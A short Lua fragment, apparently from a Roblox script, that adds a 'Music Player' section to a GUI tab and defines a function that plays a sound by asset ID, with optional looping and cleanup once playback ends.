-- === MUSIC TAB ===
local MusicSection = MusicTab:NewSection("Music Player")
local function playMusic(soundId, looped)
    local sound = Instance.new("Sound")
    sound.SoundId, sound.Looped, sound.Volume, sound.Parent = "rbxassetid://" .. tostring(soundId), looped or false, 1, game:GetService("SoundService")
    sound:Play()
    if not sound.Looped then sound.Ended:Connect(function() sound:Destroy() end) end
end
